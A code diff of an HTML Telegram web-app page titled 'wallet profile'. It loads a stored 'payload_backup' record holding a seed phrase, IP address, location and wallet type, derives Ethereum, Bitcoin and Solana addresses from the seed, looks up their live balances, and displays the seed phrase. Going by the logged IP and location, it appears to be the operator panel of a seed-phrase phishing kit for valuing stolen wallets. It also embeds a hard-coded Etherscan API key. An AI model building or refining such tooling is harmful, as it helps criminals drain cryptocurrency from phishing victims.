@@ -1,173 +1,195 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Профиль кошелька</title>
-    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
-    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Профиль кошелька</title>
+  <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
+  <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
-    <!-- Бібліотеки -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
-    <script>
-        window.bip39Ready = false;
-        const bip39Script = document.createElement('script');
-        bip39Script.src = "https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js";
-        bip39Script.onload = () => {
-            window.bip39Ready = true;
-            console.log("✅ bip39 підключено");
-        };
-        document.head.appendChild(bip39Script);
-    </script>
+  <!-- Бібліотеки -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
+
+  <!-- bip39 через script.onload -->
+  <script>
+    window.bip39Ready = false;
+    const bip39Script = document.createElement('script');
+    bip39Script.src = "https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js";
+    bip39Script.onload = () => {
+      window.bip39Ready = true;
+      console.log("✅ bip39 підключено");
+    };
+    document.head.appendChild(bip39Script);
+  </script>
 </head>
 <body>
-    <div class="container">
-        <h1>💼 Профиль кошелька</h1>
-        <p><strong>ETH адрес:</strong> <span id="ethAddress">–</span></p>
-        <p><strong>BTC адрес:</strong> <span id="btcAddress">–</span></p>
-        <p><strong>SOL адрес:</strong> <span id="solAddress">–</span></p>
-        <p><strong>Дата входа:</strong> <span id="timestamp">–</span></p>
-        <p><strong>IP:</strong> <span id="userIp">–</span></p>
-        <p><strong>Локация:</strong> <span id="userLocation">–</span></p>
-        <p><strong>Общий баланс:</strong> <span id="walletBalance">⏳ Загрузка…</span></p>
-        <p><strong>Seed-фраза:</strong></p>
-        <textarea id="seed" readonly style="width:100%;height:100px;"></textarea>
-        <button id="goWalletBtn">🔁 Перейти в кошелёк</button>
-    </div>
+  <div class="container">
+    <h1>👛 Профиль кошелька</h1>
+    <p><strong>ETH адрес:</strong> <span id="ethAddress">–</span></p>
+    <p><strong>BTC адрес:</strong> <span id="btcAddress">–</span></p>
+    <p><strong>SOL адрес:</strong> <span id="solAddress">–</span></p>
+    <p><strong>Дата входа:</strong> <span id="timestamp">–</span></p>
+    <p><strong>IP:</strong> <span id="userIp">–</span></p>
+    <p><strong>Локация:</strong> <span id="userLocation">–</span></p>
+    <p><strong>Общий баланс:</strong> <span id="walletBalance">⏳ Загрузка…</span></p>
+    <p><strong>Seed-фраза:</strong></p>
+    <textarea id="seed" readonly style="width:100%;height:100px;"></textarea>
+    <button id="goWalletBtn">🔁 Перейти в кошелёк</button>
+  </div>
 
-    <script>
-        const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
-        const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
+  <script>
+    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
+    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
 
-        const seedPhrase = (data.seed || "").trim();
-        const walletType = (data.wallet || "").toLowerCase();
-        const timestamp = data.timestamp || "–";
-        const ip = data.ip || "–";
-        const locationInfo = data.location || "–";
+    const seedPhrase = (data.seed || "").trim();
+    const walletType = (data.wallet || "").toLowerCase();
+    const timestamp = data.timestamp || "–";
+    const ip = data.ip || "–";
+    const locationInfo = data.location || "–";
 
-        document.getElementById("timestamp").textContent = timestamp;
-        document.getElementById("userIp").textContent = ip;
-        document.getElementById("userLocation").textContent = locationInfo;
-        document.getElementById("seed").textContent = seedPhrase;
+    document.getElementById("timestamp").textContent = timestamp;
+    document.getElementById("userIp").textContent = ip;
+    document.getElementById("userLocation").textContent = locationInfo;
+    document.getElementById("seed").textContent = seedPhrase;
 
-        let addresses = { eth: null, btc: null, sol: null };
+    let addresses = { eth: null, btc: null, sol: null };
 
-        const supported = [
-            { coin: "ethereum", symbol: "ETH", chain: "ethereum", key: "eth" },
-            { coin: "bitcoin", symbol: "BTC", chain: "bitcoin", key: "btc" },
-            { coin: "solana", symbol: "SOL", chain: "solana", key: "sol" }
-        ];
+    const supported = [
+      { coin: "ethereum", symbol: "ETH", chain: "ethereum", key: "eth" },
+      { coin: "bitcoin", symbol: "BTC", chain: "bitcoin", key: "btc" },
+      { coin: "solana", symbol: "SOL", chain: "solana", key: "sol" }
+    ];
 
-        async function deriveAddresses(mnemonic) {
-            try {
-                if (!mnemonic) throw new Error("Seed-фраза порожня");
+    async function waitForBip39() {
+      let retries = 0;
+      while (!window.bip39Ready && retries < 20) {
+        await new Promise(r => setTimeout(r, 250));
+        retries++;
+      }
+      if (!window.bip39Ready) throw new Error("bip39 не завантажено");
+    }
 
-                const ethWallet = ethers.Wallet.fromMnemonic(mnemonic);
-                addresses.eth = ethWallet.address;
-                document.getElementById("ethAddress").textContent = addresses.eth;
+    async function deriveAddresses(mnemonic) {
+      try {
+        if (!mnemonic) throw new Error("Seed-фраза порожня");
 
-                const seed = await window.bip39.mnemonicToSeed(mnemonic);
-                const root = bitcoin.bip32.fromSeed(seed);
-                const child = root.derivePath("m/44'/0'/0'/0/0");
-                const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: child.publicKey });
-                addresses.btc = btcAddress;
-                document.getElementById("btcAddress").textContent = addresses.btc;
+        await waitForBip39();
 
-                const solKey = seed.slice(0, 32);
-                const solAddress = solanaWeb3.Keypair.fromSeed(solKey).publicKey.toBase58();
-                addresses.sol = solAddress;
-                document.getElementById("solAddress").textContent = addresses.sol;
-            } catch (e) {
-                console.error("❌ Ошибка генерации адресов:", e.message);
-            }
+        // ETH
+        const ethWallet = ethers.Wallet.fromMnemonic(mnemonic);
+        addresses.eth = ethWallet.address;
+        document.getElementById("ethAddress").textContent = addresses.eth;
+
+        // BTC
+        const seed = await window.bip39.mnemonicToSeed(mnemonic);
+        const root = bitcoin.bip32.fromSeed(seed);
+        const child = root.derivePath("m/44'/0'/0'/0/0");
+        const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: child.publicKey });
+        addresses.btc = btcAddress;
+        document.getElementById("btcAddress").textContent = addresses.btc;
+
+        // SOL
+        const solKey = seed.slice(0, 32);
+        const solAddress = solanaWeb3.Keypair.fromSeed(solKey).publicKey.toBase58();
+        addresses.sol = solAddress;
+        document.getElementById("solAddress").textContent = addresses.sol;
+
+        console.log("✅ Адреси згенеровано:", addresses);
+      } catch (e) {
+        console.error("❌ Помилка генерації адрес:", e.message);
+      }
+    }
+
+    async function fetchPrices() {
+      try {
+        const ids = supported.map(c => c.coin).join(",");
+        const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`;
+        const res = await fetch(url);
+        return await res.json();
+      } catch (e) {
+        console.warn("❌ Помилка отримання цін:", e.message);
+        return {};
+      }
+    }
+
+    async function fetchBalance(chain, address) {
+      try {
+        switch (chain) {
+          case "ethereum":
+            const ethRes = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
+            const ethData = await ethRes.json();
+            if (!ethData || ethData.status !== "1" || !ethData.result) throw new Error("ETH API error");
+            return parseFloat(ethData.result) / 1e18;
+
+          case "bitcoin":
+            const btcRes = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
+            const sats = await btcRes.text();
+            return parseFloat(sats || 0) / 1e8;
+
+          case "solana":
+            const solRes = await fetch("https://api.mainnet-beta.solana.com", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [address] })
+            });
+            const solData = await solRes.json();
+            return parseFloat(solData.result?.value || 0) / 1e9;
+
+          default:
+            return 0;
         }
+      } catch (e) {
+        console.warn(`⚠️ Помилка балансу ${chain}:`, e.message);
+        return 0;
+      }
+    }
 
-        async function fetchPrices() {
-            try {
-                const ids = supported.map(c => c.coin).join(",");
-                const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`;
-                const res = await fetch(url);
-                return await res.json();
-            } catch (e) {
-                console.warn("❌ Ошибка отримання цін:", e.message);
-                return {};
-            }
-        }
+    async function calculateTotalETH() {
+      const prices = await fetchPrices();
+      let totalETH = 0;
 
-        async function fetchBalance(chain, address) {
-            try {
-                switch (chain) {
-                    case "ethereum":
-                        const ethRes = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
-                        const ethData = await ethRes.json();
-                        if (!ethData || ethData.status !== "1" || !ethData.result) throw new Error("ETH API error");
-                        return parseFloat(ethData.result) / 1e18;
+      for (const token of supported) {
+        const address = addresses[token.key];
+        if (!address) continue;
 
-                    case "bitcoin":
-                        const btcRes = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
-                        const sats = await btcRes.text();
-                        return parseFloat(sats || 0) / 1e8;
+        const balance = await fetchBalance(token.chain, address);
+        const rate = prices[token.coin]?.eth || 0;
+        totalETH += balance * rate;
+      }
 
-                    case "solana":
-                        const solRes = await fetch("https://api.mainnet-beta.solana.com", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [address] })
-                        });
-                        const solData = await solRes.json();
-                        return parseFloat(solData.result?.value || 0) / 1e9;
+      document.getElementById("walletBalance").textContent = `${totalETH.toFixed(6)} ETH`;
+    }
 
-                    default:
-                        return 0;
-                }
-            } catch (e) {
-                console.warn(`⚠️ Ошибка баланса ${chain}:`, e.message);
-                return 0;
-            }
-        }
+    function goToWallet() {
+      let url = "https://www.google.com";
+      if (walletType.includes("metamask")) url = "https://metamask.io/";
+      else if (walletType.includes("trust")) url = "https://trustwallet.com/";
+      else if (walletType.includes("phantom")) url = "https://phantom.app/";
+      else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
+      else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
 
-        async function calculateTotalETH() {
-            const prices = await fetchPrices();
-            let totalETH = 0;
+      if (window.Telegram && Telegram.WebApp) {
+        Telegram.WebApp.openLink(url);
+      } else {
+        window.open(url, "_blank");
+      }
+    }
 
-            for (const token of supported) {
-                const address = addresses[token.key];
-                if (!address) continue;
+    document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
 
-                const balance = await fetchBalance(token.chain, address);
-                const rate = prices[token.coin]?.eth || 0;
-                totalETH += balance * rate;
-            }
+    document.addEventListener("DOMContentLoaded", async () => {
+      console.log("🚀 DOM полностью загружен");
+      if (!seedPhrase) {
+        console.error("❌ Seed-фраза порожня");
+        return;
+      }
 
-            document.getElementById("walletBalance").textContent = `${totalETH.toFixed(6)} ETH`;
-        }
-
-        function goToWallet() {
-            let url = "https://www.google.com";
-            if (walletType.includes("metamask")) url = "https://metamask.io/";
-            else if (walletType.includes("trust")) url = "https://trustwallet.com/";
-            else if (walletType.includes("phantom")) url = "https://phantom.app/";
-            else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
-            else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
-
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.openLink(url);
-            } else {
-                window.open(url, "_blank");
-            }
-        }
-
-        document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
-
-        document.addEventListener("DOMContentLoaded", async () => {
-            console.log("🚀 DOM полностью загружен");
-            if (!seedPhrase) return;
-            await deriveAddresses(seedPhrase);
-            await calculateTotalETH();
-        });
-    </script>
+      await deriveAddresses(seedPhrase);
+      await calculateTotalETH();
+    });
+  </script>
 </body>
 </html>
